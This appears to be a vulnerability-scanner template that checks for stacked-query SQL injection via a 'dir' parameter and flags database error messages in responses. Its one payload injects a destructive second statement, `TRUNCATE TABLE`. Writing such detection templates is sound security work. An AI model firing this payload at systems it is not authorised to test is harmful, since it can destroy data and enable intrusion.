id: sqli3-stacked-036
name: 'Stacked query in dir'
severity: critical
type: active
tags:
  - sqli
  - injection
  - stacked
description: 'Extra SQL statement via dir'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      dir:
        - '''; TRUNCATE TABLE t--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
          - 'PostgreSQL'
          - 'ODBC'
          - 'ORA-'
          - 'SQLite'
